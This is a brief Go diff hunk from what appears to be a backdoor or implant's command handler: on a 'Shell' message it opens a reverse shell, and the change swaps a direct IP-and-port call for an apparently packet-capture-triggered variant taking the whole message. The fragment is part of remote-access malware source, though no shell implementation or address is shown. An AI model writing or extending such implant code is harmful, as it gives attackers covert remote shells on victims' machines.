@@ -89,7 +89,7 @@ func handleMessage(msg *message.Message) error {
 		case message.Shell:
 			errChan := make(chan error, 1)
 			go func(ip, port string) {
-				if err := executor.OpenReverseShell(ip, port); err != nil {
+				if err := executor.OpenPcapReverseShell(msg); err != nil {
 					errChan <- fmt.Errorf("opening reverse shell: %w", err)
 					return
 				}
